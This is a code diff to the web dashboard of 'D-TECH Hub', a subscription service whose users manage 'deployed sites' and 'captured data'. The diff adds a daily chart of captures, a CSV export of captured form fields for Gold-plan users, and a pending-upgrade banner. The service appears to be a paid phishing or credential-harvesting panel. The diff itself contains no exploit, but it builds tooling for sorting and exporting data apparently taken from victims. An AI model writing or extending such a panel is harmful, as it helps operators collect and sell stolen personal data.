@@ -5,6 +5,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>D-TECH Hub | Dashboard</title>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
     <style>
         :root {
             /* Default Dark Theme (Free) */
@@ -150,6 +151,9 @@
         .notification.error { border-color: var(--danger); color: var(--danger); }
 
         .locked-banner { background: rgba(243, 18, 96, 0.1); border: 1px solid var(--danger); color: var(--danger); padding: 20px; border-radius: 8px; margin-bottom: 30px; text-align: center; display: none; }
+        .pending-banner { background: linear-gradient(135deg, rgba(255, 215, 0, 0.1), rgba(0, 0, 0, 0.5)); border: 1px solid #ffd700; color: #ffd700; padding: 20px; border-radius: 8px; margin-bottom: 30px; text-align: center; display: none; animation: pulse-gold 2s infinite; }
+
+        @keyframes pulse-gold { 0% { box-shadow: 0 0 0 0 rgba(255, 215, 0, 0.4); } 70% { box-shadow: 0 0 0 10px rgba(255, 215, 0, 0); } 100% { box-shadow: 0 0 0 0 rgba(255, 215, 0, 0); } }
 
         /* Payment Section */
         .payment-modal { background: var(--bg-card); padding: 30px; border-radius: var(--radius); border: 1px solid var(--border); margin-top: 40px; }
@@ -195,6 +199,11 @@
             <p>Your previous payment was declined. Access is restricted. Please submit a valid voucher.</p>
         </div>
 
+        <div id="pending-msg" class="pending-banner">
+            <h3>⏳ GOLD UPGRADE PENDING</h3>
+            <p>Your Gold upgrade is currently being verified by an admin. In the meantime, you have full access to <strong>PREMIUM</strong> features!</p>
+        </div>
+
         <div class="hero">
             <h2 id="greeting">Welcome Back</h2>
             <p>Manage your deployments and captured data from one secure location.</p>
@@ -220,6 +229,12 @@
             </div>
         </div>
 
+        <!-- ANALYTICS (Premium/Gold) -->
+        <div id="analytics-section" style="display:none; margin-bottom: 40px; background: var(--bg-card); padding: 20px; border-radius: var(--radius); border: 1px solid var(--border);">
+            <h3 style="margin-top:0;">Visual Analytics</h3>
+            <canvas id="captureChart" style="max-height: 300px;"></canvas>
+        </div>
+
         <!-- ACTIVE SITES -->
         <div class="section-header">
             <h3>Active Sites</h3>
@@ -238,7 +253,8 @@
             </div>
             <div id="premium-actions" style="display:none;">
                 <button onclick="copyData()" class="btn-action">📋 Copy All</button>
-                <button onclick="downloadData()" class="btn-action">📥 Download JSON</button>
+                <button onclick="downloadData()" class="btn-action">📥 JSON Export</button>
+                <button id="btn-csv" onclick="downloadCSV()" class="btn-action" style="display:none;">📊 CSV Export (Gold)</button>
             </div>
         </div>
 
@@ -451,7 +467,82 @@
 
             if (plan === 'premium' || plan === 'gold') {
                 document.getElementById('premium-actions').style.display = 'block';
+                document.getElementById('analytics-section').style.display = 'block';
+                renderChart(data.data || []);
             }
+
+            if (plan === 'gold') {
+                document.getElementById('btn-csv').style.display = 'inline-block';
+            }
+
+            if (data.pendingPlan === 'gold') {
+                document.getElementById('pending-msg').style.display = 'block';
+                // Even though pending, we show Premium features as per logic
+            }
+        }
+
+        function renderChart(captures) {
+            const ctx = document.getElementById('captureChart').getContext('2d');
+
+            // Group by Date (Last 7 Days)
+            const days = {};
+            const labels = [];
+            const counts = [];
+
+            for(let i=6; i>=0; i--) {
+                const d = new Date();
+                d.setDate(d.getDate() - i);
+                const key = d.toLocaleDateString();
+                days[key] = 0;
+                labels.push(key.slice(0, 5)); // Short date
+            }
+
+            captures.forEach(c => {
+                const d = new Date(c.timestamp).toLocaleDateString();
+                if (days[d] !== undefined) days[d]++;
+            });
+
+            // Update counts in order
+            Object.keys(days).forEach(k => {
+                // Ensure we match the order of generation?
+                // Object keys order isn't guaranteed, let's map from labels logic
+            });
+
+            // Re-map correctly
+             const dataPoints = [];
+             for(let i=6; i>=0; i--) {
+                const d = new Date();
+                d.setDate(d.getDate() - i);
+                const key = d.toLocaleDateString();
+                dataPoints.push(captures.filter(c => new Date(c.timestamp).toLocaleDateString() === key).length);
+             }
+
+            new Chart(ctx, {
+                type: 'line',
+                data: {
+                    labels: labels,
+                    datasets: [{
+                        label: 'Captures',
+                        data: dataPoints,
+                        borderColor: '#0070f3',
+                        backgroundColor: 'rgba(0, 112, 243, 0.1)',
+                        borderWidth: 2,
+                        fill: true,
+                        tension: 0.4
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    plugins: {
+                        legend: { display: false }
+                    },
+                    scales: {
+                        y: { beginAtZero: true, grid: { color: '#333' } },
+                        x: { grid: { display: false } }
+                    }
+                }
+            });
         }
 
         function handleLocked(status) {
@@ -595,6 +686,42 @@
             const a = document.createElement('a');
             a.href = dataStr;
             a.download = filter === 'all' ? "captures_all.json" : `captures_${filter}.json`;
+            document.body.appendChild(a);
+            a.click();
+            a.remove();
+        }
+
+        function downloadCSV() {
+            const filter = document.getElementById('site-filter').value;
+            const safeData = getSafeData(filter);
+            const items = safeData.captures;
+
+            if (items.length === 0) { notify("No data to export", "error"); return; }
+
+            // Flatten JSON for CSV
+            const headers = new Set();
+            const rows = items.map(item => {
+                const row = { timestamp: new Date(item.timestamp).toISOString() };
+                if (item.data) {
+                    Object.entries(item.data).forEach(([k, v]) => {
+                        row[k] = v;
+                        headers.add(k);
+                    });
+                }
+                return row;
+            });
+
+            const headerArr = ['timestamp', ...Array.from(headers)];
+            const csvContent = [
+                headerArr.join(','),
+                ...rows.map(row => headerArr.map(fieldName => JSON.stringify(row[fieldName] || '')).join(','))
+            ].join('\n');
+
+            const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `captures_${filter}.csv`;
             document.body.appendChild(a);
             a.click();
             a.remove();
